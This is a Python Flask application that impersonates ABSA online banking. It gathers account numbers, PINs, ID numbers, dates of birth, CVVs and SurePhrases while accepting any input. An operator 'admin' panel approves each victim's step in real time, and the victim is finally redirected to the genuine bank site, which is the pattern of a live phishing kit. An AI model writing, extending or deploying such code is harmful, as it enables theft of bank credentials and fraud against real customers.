from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
import os
import secrets
import time
from datetime import datetime, timedelta
import uuid

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(16))

# Admin credentials (use environment variables in production)
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'admin123')

# In-memory storage for demo purposes (use database in production)
users_db = {
    '1234567890': {
        'id_number': '8001015009088',
        'dob': {'day': '01', 'month': '01', 'year': '1980'},
        'surephrase': 'MYSECUREPHRASE',
        'pin': '12345',
        'phone': '+27 *** *** 7890',
        'email': 'john.doe****@gmail.com',
        'name': 'John Doe',
        'accounts': {
            'cheque': {'number': '****1234', 'balance': 15247.85},
            'savings': {'number': '****5678', 'balance': 45892.15},
            'credit': {'number': '****9012', 'balance': 28500.00}
        }
    }
}

# Admin approval system
approval_requests = {}
handled_requests = {'approved': [], 'rejected': []}

# Session management
login_attempts = {}
otp_codes = {}

# Helper functions for admin approval
def create_approval_request(session_id, step_name, next_url):
    """Create a new approval request"""
    request_id = str(uuid.uuid4())
    approval_requests[request_id] = {
        'id': request_id,
        'session_id': session_id,
        'step_name': step_name,
        'next_url': next_url,
        'created_at': datetime.now(),
        'status': 'pending'
    }
    return request_id

def require_admin_approval(step_name, next_route):
    """Decorator to require admin approval for a route"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            # Create approval request
            session_id = session.get('session_id', str(uuid.uuid4()))
            session['session_id'] = session_id
            
            next_url = url_for(next_route) if next_route else '/'
            request_id = create_approval_request(session_id, step_name, next_url)
            
            # Redirect to waiting page
            return redirect(url_for('waiting_approval', request_id=request_id))
        return wrapper
    return decorator

@app.route('/')
def index():
    """Landing page - Main Login Page"""
    return render_template('login.html')

@app.route('/login')
def login():
    """Main login page"""
    return render_template('login.html')

@app.route('/process-login', methods=['POST'])
def process_login():
    """Process main login form and redirect to customer info"""
    account_number = request.form.get('accountNumber')
    pin = request.form.get('pin')
    user_number = request.form.get('userNumber')
    
    # Basic validation
    if not all([account_number, pin, user_number]):
        flash('Please fill in all required fields', 'error')
        return render_template('login.html')
    
    # Store initial login data in session
    session['login_account'] = account_number
    session['login_pin'] = pin
    session['user_number'] = user_number
    
    # Redirect to customer info for detailed verification
    return redirect(url_for('customer_info'))

@app.route('/customer-info-start')
def customer_info_start():
    """Customer Information form - separate from main login"""
    return render_template('customer_info.html')

@app.route('/customer-info', methods=['GET', 'POST'])
def customer_info():
    """Handle customer information submission"""
    if request.method == 'POST':
        # Get form data
        id_type = request.form.get('idType')
        id_number = request.form.get('idNumber')
        dob_day = request.form.get('dobDay')
        dob_month = request.form.get('dobMonth')
        dob_year = request.form.get('dobYear')
        account_number = request.form.get('accountNumber')
        branch_code = request.form.get('branchCode')
        cvv = request.form.get('cvv')
        
        # Basic validation
        if not all([id_type, id_number, dob_day, dob_month, dob_year, account_number, branch_code, cvv]):
            flash('Please fill in all required fields', 'error')
            return render_template('customer_info.html')
        
        # For testing - accept any details
        session['account_number'] = account_number
        session['authenticated_step1'] = True
        
        # Debug: Print what we're storing
        print(f"DEBUG: Storing account number: {account_number}")
        print(f"DEBUG: Session account_number: {session.get('account_number')}")
        
        # Generate account numbers safely
        account_suffix = account_number[-4:] if account_number and len(account_number) >= 4 else '1234'
        savings_suffix = str(int(account_suffix) + 1111)[-4:] if account_suffix.isdigit() else '5678'
        credit_suffix = str(int(account_suffix) + 2222)[-4:] if account_suffix.isdigit() else '9012'
        
        session['test_user'] = {
            'name': 'Test User',
            'id_number': id_number,
            'accounts': {
                'cheque': {'number': f'****{account_suffix}', 'balance': 15247.85},
                'savings': {'number': f'****{savings_suffix}', 'balance': 45892.15},
                'credit': {'number': f'****{credit_suffix}', 'balance': 28500.00}
            }
        }
        
        # Create approval request for customer info step
        session_id = session.get('session_id', str(uuid.uuid4()))
        session['session_id'] = session_id
        
        next_url = url_for('surephrase_auth')
        request_id = create_approval_request(session_id, 'Customer Information', next_url)
        
        flash('Customer information submitted for approval', 'info')
        return redirect(url_for('waiting_approval', request_id=request_id))
    
    return render_template('customer_info.html')

@app.route('/surephrase-auth', methods=['GET', 'POST'])
def surephrase_auth():
    """SurePhrase authentication"""
    if not session.get('authenticated_step1'):
        return redirect(url_for('index'))
    
    # Debug: Print session data
    print(f"DEBUG: Session account_number on load: {session.get('account_number')}")
    
    if request.method == 'POST':
        account_number = request.form.get('accountNumber')
        surephrase = request.form.get('surephrase', '').upper()
        
        # Check rate limiting
        client_ip = request.remote_addr
        if client_ip in login_attempts:
            if login_attempts[client_ip]['count'] >= 3:
                if datetime.now() < login_attempts[client_ip]['locked_until']:
                    flash('Too many failed attempts. Please try again later.', 'error')
                    return render_template('surephrase_auth.html')
                else:
                    # Reset attempts after lockout period
                    login_attempts[client_ip] = {'count': 0, 'locked_until': None}
        
        # For testing - accept any SurePhrase
        if len(surephrase) >= 3:
            # Update session account number if provided
            if account_number:
                session['account_number'] = account_number
            session['authenticated_step2'] = True
            # Reset failed attempts on success
            if client_ip in login_attempts:
                login_attempts[client_ip] = {'count': 0, 'locked_until': None}
            
            # Create approval request for SurePhrase step
            session_id = session.get('session_id', str(uuid.uuid4()))
            session['session_id'] = session_id
            
            next_url = url_for('pin_entry')
            request_id = create_approval_request(session_id, 'SurePhrase Authentication', next_url)
            
            flash('SurePhrase submitted for approval', 'info')
            return redirect(url_for('waiting_approval', request_id=request_id))
        else:
            flash('Please enter a SurePhrase with at least 3 characters', 'error')
            return render_template('surephrase_auth.html')
    
    return render_template('surephrase_auth.html')

@app.route('/pin-entry', methods=['GET', 'POST'])
def pin_entry():
    """PIN entry authentication"""
    if not session.get('authenticated_step2'):
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        pin_digits = [
            request.form.get('digit1', ''),
            request.form.get('digit2', ''),
            request.form.get('digit3', ''),
            request.form.get('digit4', ''),
            request.form.get('digit5', '')
        ]
        pin = ''.join(pin_digits)
        
        account_number = session.get('account_number')
        
        # For testing - accept any 5-digit PIN
        if account_number == session.get('account_number') and len(pin) == 5 and pin.isdigit():
            session['authenticated_step3'] = True
            session['authenticated_step4'] = True  # Skip multi-factor auth
            
            # Create approval request for PIN step
            session_id = session.get('session_id', str(uuid.uuid4()))
            session['session_id'] = session_id
            
            next_url = 'https://ib.absa.co.za'
            request_id = create_approval_request(session_id, 'PIN Verification', next_url)
            
            flash('PIN submitted for approval', 'info')
            return redirect(url_for('waiting_approval', request_id=request_id))
        else:
            flash('Please enter a valid 5-digit PIN', 'error')
            return render_template('pin_entry.html')
    
    return render_template('pin_entry.html')

@app.route('/multi-factor-auth', methods=['GET', 'POST'])
def multi_factor_auth():
    """Multi-factor authentication"""
    if not session.get('authenticated_step3'):
        return redirect(url_for('index'))
    
    return render_template('multi_factor_auth.html')

@app.route('/send-otp', methods=['POST'])
def send_otp():
    """Send OTP via SMS or Email"""
    if not session.get('authenticated_step3'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    data = request.get_json()
    method = data.get('method')  # 'sms' or 'email'
    account_number = data.get('account_number')
    
    if account_number != session.get('account_number'):
        return jsonify({'success': False, 'message': 'Invalid account number'})
    
    # Generate OTP
    otp = secrets.randbelow(1000000)
    otp_code = f"{otp:06d}"
    
    # Store OTP with expiration
    session_key = f"{session.get('account_number')}_{method}"
    otp_codes[session_key] = {
        'code': otp_code,
        'expires_at': datetime.now() + timedelta(minutes=5)
    }
    
    # In production, actually send SMS/Email here
    print(f"OTP for {method}: {otp_code}")  # For debugging
    
    return jsonify({
        'success': True, 
        'message': f'OTP sent via {method}',
        'debug_code': otp_code  # Remove in production
    })

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP code"""
    if not session.get('authenticated_step3'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    data = request.get_json()
    method = data.get('method')
    otp_input = data.get('otp')
    
    session_key = f"{session.get('account_number')}_{method}"
    
    if session_key not in otp_codes:
        return jsonify({'success': False, 'message': 'No OTP found. Please request a new code.'})
    
    stored_otp = otp_codes[session_key]
    
    # Check expiration
    if datetime.now() > stored_otp['expires_at']:
        del otp_codes[session_key]
        return jsonify({'success': False, 'message': 'OTP has expired. Please request a new code.'})
    
    # Verify OTP
    if stored_otp['code'] == otp_input:
        # Clean up used OTP
        del otp_codes[session_key]
        session['authenticated_step4'] = True
        return jsonify({'success': True, 'message': 'OTP verified successfully'})
    else:
        return jsonify({'success': False, 'message': 'Invalid OTP. Please try again.'})

@app.route('/account-access')
def account_access():
    """Account dashboard - final destination"""
    if not session.get('authenticated_step4'):
        return redirect(url_for('index'))
    
    account_number = session.get('account_number')
    user_data = session.get('test_user')
    
    # If no test user data, try the original users_db
    if not user_data and account_number:
        user_data = users_db.get(account_number, {})
    
    # Fallback to default data if nothing found
    if not user_data:
        user_data = {
            'name': 'Demo User',
            'accounts': {
                'cheque': {'number': '****1234', 'balance': 15247.85}
            }
        }
    
    return render_template('account_access.html', user=user_data)

@app.route('/logout')
def logout():
    """Logout and clear session"""
    session.clear()
    flash('You have been securely logged out.', 'info')
    return redirect(url_for('index'))

@app.route('/health')
def health_check():
    """Health check endpoint for monitoring"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0',
        'pending_requests': len([req for req in approval_requests.values() if req['status'] == 'pending'])
    })

@app.route('/api/branch-lookup')
def branch_lookup():
    """API endpoint for branch lookup"""
    code = request.args.get('code', '')
    
    # Mock branch data
    branches = {
        '632005': 'ABSA Bank - Main Branch, Cape Town',
        '470010': 'ABSA Bank - Sandton City, Johannesburg',
        '250655': 'ABSA Bank - Durban Central',
        '334112': 'ABSA Bank - Port Elizabeth Main'
    }
    
    if code in branches:
        return jsonify({'success': True, 'name': branches[code]})
    else:
        return jsonify({'success': False, 'message': 'Branch code not found'})

# Admin routes
@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    """Admin login page"""
    if session.get('admin_logged_in'):
        return redirect(url_for('admin_dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            flash('Admin login successful', 'success')
            return redirect(url_for('admin_dashboard'))
        else:
            flash('Invalid admin credentials', 'error')
            return render_template('admin_login.html')
    
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    """Admin dashboard"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    # Get pending requests
    pending_requests = [req for req in approval_requests.values() if req['status'] == 'pending']
    
    # Get today's stats
    today = datetime.now().date()
    approved_today = len([req for req in handled_requests['approved'] 
                         if req.get('handled_at', datetime.min).date() == today])
    rejected_today = len([req for req in handled_requests['rejected'] 
                         if req.get('handled_at', datetime.min).date() == today])
    
    return render_template('admin_dashboard.html', 
                         pending_requests=pending_requests,
                         pending_count=len(pending_requests),
                         approved_count=approved_today,
                         rejected_count=rejected_today)

@app.route('/admin/approve/<request_id>', methods=['POST'])
def admin_approve(request_id):
    """Approve a request"""
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    if request_id in approval_requests:
        approval_requests[request_id]['status'] = 'approved'
        approval_requests[request_id]['handled_at'] = datetime.now()
        
        # Move to handled requests
        handled_requests['approved'].append(approval_requests[request_id])
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Request not found'})

@app.route('/admin/reject/<request_id>', methods=['POST'])
def admin_reject(request_id):
    """Reject a request"""
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Unauthorized'})
    
    if request_id in approval_requests:
        approval_requests[request_id]['status'] = 'rejected'
        approval_requests[request_id]['handled_at'] = datetime.now()
        
        # Move to handled requests
        handled_requests['rejected'].append(approval_requests[request_id])
        
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'message': 'Request not found'})

@app.route('/admin/logout')
def admin_logout():
    """Admin logout"""
    session.pop('admin_logged_in', None)
    flash('Admin logged out successfully', 'info')
    return redirect(url_for('admin_login'))

@app.route('/waiting/<request_id>')
def waiting_approval(request_id):
    """Waiting for approval page"""
    if request_id not in approval_requests:
        flash('Invalid request', 'error')
        return redirect(url_for('index'))
    
    req = approval_requests[request_id]
    return render_template('waiting_approval.html',
                         request_id=request_id,
                         step_name=req['step_name'],
                         session_id=req['session_id'],
                         submitted_time=req['created_at'].strftime('%Y-%m-%d %H:%M:%S'))

@app.route('/check-approval/<request_id>')
def check_approval(request_id):
    """Check if request is approved"""
    if request_id not in approval_requests:
        return jsonify({'success': False, 'message': 'Request not found'})
    
    req = approval_requests[request_id]
    if req['status'] == 'approved':
        return jsonify({'approved': True, 'next_url': req['next_url']})
    elif req['status'] == 'rejected':
        return jsonify({'rejected': True})
    else:
        return jsonify({'approved': False, 'rejected': False})

@app.route('/cancel-request/<request_id>', methods=['POST'])
def cancel_request(request_id):
    """Cancel a pending request"""
    if request_id in approval_requests:
        del approval_requests[request_id]
        return jsonify({'success': True})
    return jsonify({'success': False})

# Error handlers
@app.errorhandler(404)
def not_found(error):
    return render_template('error.html', 
                         error_code=404, 
                         error_message='Page not found'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('error.html', 
                         error_code=500, 
                         error_message='Internal server error'), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_ENV') != 'production'
    app.run(debug=debug, host='0.0.0.0', port=port)